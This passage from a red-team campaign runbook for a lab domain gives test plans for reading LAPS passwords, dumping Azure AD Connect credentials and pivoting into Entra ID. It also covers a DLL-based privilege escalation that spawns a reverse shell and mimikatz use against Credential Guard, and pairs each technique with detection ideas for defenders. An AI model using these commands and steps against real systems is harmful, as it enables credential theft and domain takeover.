1. From Kali with domain user creds: `ldapsearch -x -H ldap://dc01.cadre.local -b "DC=cadre,DC=local" "(ms-Mcs-AdmPwd=*)" ms-Mcs-AdmPwd`
2. Or via PowerShell: `Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Select-Object Name, ms-Mcs-AdmPwd`
3. Check: which users have Read permission on LAPS attribute?

**Detection:** WinSec 4662 (AD object access — reading LAPS password attribute), Sysmon EID 1 (LDAP query for LAPS attributes).

---

#### 3.5M — Azure AD Connect DPAPI Dump (T1555) ⏳

**Source:** dirkjanm.io (2019)
**Tool:** adconnectdump ([https://github.com/fox-it/adconnectdump](https://github.com/fox-it/adconnectdump))
**MITRE:** T1555 (Credentials from Password Stores)

CADRE has the Cloud Sync agent on dc01. The MSOL account credentials are stored using DPAPI. Once SYSTEM is obtained, adconnectdump can extract these credentials and pivot to Entra ID.

**Why this matters:**

- This is the bridge from on-prem (Phase 3 SYSTEM) to cloud (Plan 11 EntraGoat)
- One compromise = on-prem + cloud compromise
- Cloud Sync agent access is heavily monitored in real environments

**Test plan:**

1. Get SYSTEM on dc01 (via Phase 3 chain or direct)
2. Run adconnectdump on dc01
3. Extract MSOL account credentials
4. Use ROADtools to authenticate to Entra ID
5. Enumerate users, groups, applications

**Detection:** Sysmon EID 1 (adconnectdump.exe), file create events on MSOL credential files, Azure AD sign-in log — MSOL from unusual IP.

**Bridge to Plan 11 (Cloud/Entra ID) — BARK as primary tool 🆕:**

After extracting MSOL credentials via adconnectdump, the next attack surface is **Azure/Entra ID**. Per `docs/internal/references/ad-tools-landscape-2026-06-24.md`, the primary tool for Azure/Entra ID abuse validation is **BARK (BloodHound Attack Research Kit)** — https://github.com/BloodHoundAD/BARK.

```powershell
# In EntraGoat (separate Azure tenant for Plan 11 testing)
# 1. Clone BARK
git clone https://github.com/BloodHoundAD/BARK
# 2. Import module
Import-Module .\BARK.ps1
# 3. Enumerate Entra ID
Get-AllEntraApps
Get-AllEntraUsers
Get-AllEntraGroups
Get-EntraTierZeroServicePrincipals
# 4. Test abuse primitives
Invoke-AllEntraAbuseTests
```

**Why BARK for Plan 11:** BARK has 80+ functions for Azure/Entra ID abuse — token management, Entra enumeration, AzureRM enumeration, Intune enumeration, abuse functions, meta-testing functions. It's the **Azure/Entra equivalent of bloodyAD** for on-prem AD. Same author CravateRouge contributes to both. Used by SpecterOps to validate Azure abuse primitives as Microsoft ships patches.

**CADRE mapping:** Plan 11 is held until after main spine (Phases 0-8 + branches) is verified. When we reach Plan 11:
- Use BARK for: Entra ID enumeration, abuse chain testing, Intune exploration
- Use **ROADtools** (Dirk-jan) for: token acquisition, Graph API exploration
- Use **AADInternals** (Gerenios) for: legacy Azure AD attack primitives
- Use **AzureHound** (marklindner11) for: BloodHound data ingest for Entra ID

**Cross-references:** See Campaign_suggestions.md #96 for full BARK function inventory. Pairs with bloodyAD (#91) — same author, different domain. Plan 11 items #69-75 (Dirk-jan's Cloud Kerberos Trust, Actor Tokens, PRT Phishing, Intune ADCS, TAP, Federated Creds, App Admin) all use BARK as the validation framework.

---

#### 3.5N — UnCanny LPE: Non-Admin → SYSTEM via InstallService (T1068, T1574.001) ⏳

**Source:** 0xHossam/UnCanny ([https://github.com/0xHossam/UnCanny](https://github.com/0xHossam/UnCanny), 2026-06-19) — same technique as WT094, but with DLL present = SYSTEM shell
**MITRE:** T1068 Exploitation for Privilege Escalation, T1574.001 Hijack Execution Flow (DLL Side-Loading)

This is the **direct EoP** version of UnCanny (3.5N pairs with WT094 coercion). If the attacker can serve a real DLL via SMB (Samba required — impacket returns `ERROR_INVALID_HANDLE` for `LoadLibraryW`), `DllMain` runs as `NT AUTHORITY\SYSTEM` inside `svchost.exe` (the `InstallService` host).

**Pre-conditions (same as WT094):**

- Standard user on Win 10/11 OR Server 2022/2025
- **Developer Mode enabled** (`HKLM\...\AppModelUnlock\AllowDevelopmentWithoutDevLicense = 1`)
- `InstallService.exe` + `AppXSvc` running (default)

**Difference from WT094:** Real DLL must exist on the share. Author confirmed impacket fails for the loadable-image case but Samba works (Samba reports NTFS by default so loose registration still works).

**Test plan (gated on WT094 success):**

1. Compile `lpe/lpe.c` and `lpe/plugin.c` (from cloned repo) as a DLL with `DllMain` that spawns reverse shell
2. Stage on Samba share (not impacket) — `apt install samba` if not present
3. Same trigger as WT094 but with DLL present at the UNC
4. Confirm `NT AUTHORITY\SYSTEM` shell in `svchost.exe` context (token check)
5. Direct SYSTEM — no GodPotato/PrintSpoofer needed

**Why this is significant for CADRE:**

- **Direct SYSTEM from any standard user** — bypasses our existing EoP chain (xp_cmdshell → GodPotato)
- Useful when we don't have SQL access (Branch D Linux pivot, Phase 3 alternative paths)
- Demonstrates why Microsoft Defender's RPC activity monitoring (added in 2024) was the wrong path to block — UnCanny goes via AppX/AppXSvc, not RPC

*Detection (cadre-e candidates):**

- `svchost.exe` (hosting InstallService) mapping remote DLL — `logs-endpoint.events.file-`* or ETW `Microsoft-Windows-Threat-Intelligence`
- `DllMain` thread context: `NT AUTHORITY\SYSTEM` executing in `svchost.exe` spawned by AppX service
- `CreateInstallServiceWork` COM invocation from non-system context

**Status:** 🔬 Deferred — gated on Developer Mode + Samba setup. Per user 2026-06-19: "document only, defer test" — see Campaign_suggestions.md Track G.

---

---



---

## Study references (read before this phase)

## 📖 Study Reference Library

> **Purpose:** This section tracks articles, blog posts, and external research that we need to read/study **before** or **during** a specific phase of the campaign. These are not direct attack techniques but contextual reading that deepens understanding of the techniques we do execute.
>
> **Convention:** Each entry marked with 📖 is a study reference. The phase tag tells you WHEN to read it. **Add new study refs here as they're identified in `Campaign_suggestions.md`** so we never lose track.


### Phase 3.5 — Credential Access (read BEFORE testing)

#### 📖 Windows Logon Types & Credential Storage Locations

**Why read:** When harvesting credentials in Phase 3.5, knowing WHERE Windows stores credentials (and which logon type triggers which storage) is critical. Different LSASS protection mechanisms (PPL, Credential Guard) protect different storage locations.

**Source:** [Windows Logon Types — HackTricks](https://book.hacktricks.xyz/windows-hardening/authentication-credentials/windows-logon-types) and [Windows Authentication Architecture — Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-protection-and-management/authentication-protocols-overview)

**Key concepts to internalize:**

- Logon Type 2 (Interactive) → credentials in `lsass` MSV1_0 + WDigest (if enabled)
- Logon Type 3 (Network) → NTLMv1/v2 in network packets
- Logon Type 9 (NewCredentials) → runas /netonly
- Logon Type 10 (RemoteInteractive) → RDP, stored in `tspkg` + `wdigest`
- Credential storage packages in LSASS: `msv1_0.dll`, `wdigest.dll`, `tspkg.dll`, `livessp.dll`, `kerberos.dll`, `cloudap.dll`
- Each can be targeted independently — disabling WDigest in Server 2025 hides Type 2/10 plaintext but Kerberos tickets still expose hashable material

**Action item:** Read the HackTricks Logon Types reference before running any 3.5X technique. Print the table; reference it during 3.5F (LSASS dump) execution to know which package entries to look for in mimikatz output.

#### 📖 Credential Guard Bypass Research

**Why read:** Server 2025 has Credential Guard enabled by default in many enterprise configs. It isolates `lsass.exe` secrets into a VTL (Virtual Trust Level) 1 hypervisor-protected memory region. Standard mimikatz `sekurlsa::logonpasswords` returns nothing against Credential Guard.

**Source:** [Credential Guard — Microsoft Learn](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-overview), [Bypassing Credential Guard — Wdormann / MITRE](https://github.com/Wdormann/Mitigating-Credential-Theft), [ired.team — Credential Guard](https://www.ired.team/offensive-security/credential-access-and-reuse/bypassing-credential-guard)

**Key concepts to internalize:**

- Credential Guard uses **VBS (Virtualization-Based Security)** to isolate LSASS into VTL 1
- Direct LSASS read (OpenProcess + ReadProcessMemory) returns 0-byte buffers
- `lsadump::sam` (registry-based) STILL works because SAM is not VTL-protected
- `lsadump::secrets` (LSA secrets) requires SYSTEM, but the secrets are outside VTL 1
- `dpapi::masterkey` / `dpapi::cred` works on the current user's masterkey (not in VTL 1)
- New bypasses (2024-2025): leaked Kerberos tickets from VTL 0 process memory, `wdigest` cleartext before logoff

**Action item:** Read Wdormann's reference PDF before running 3.5F/G/H/I. Test which mimikatz modules fail on CADRE VMs (likely `sekurlsa::logonpasswords`) and which still work (likely `lsadump::sam`, `lsadump::secrets`, `dpapi::`*).

---

## Navigation

← Previous: [`CAMPAIGNS-RUNBOOK-3.md`](CAMPAIGNS-RUNBOOK-3.md) · Next: [`CAMPAIGNS-RUNBOOK-4.md`](CAMPAIGNS-RUNBOOK-4.md) →
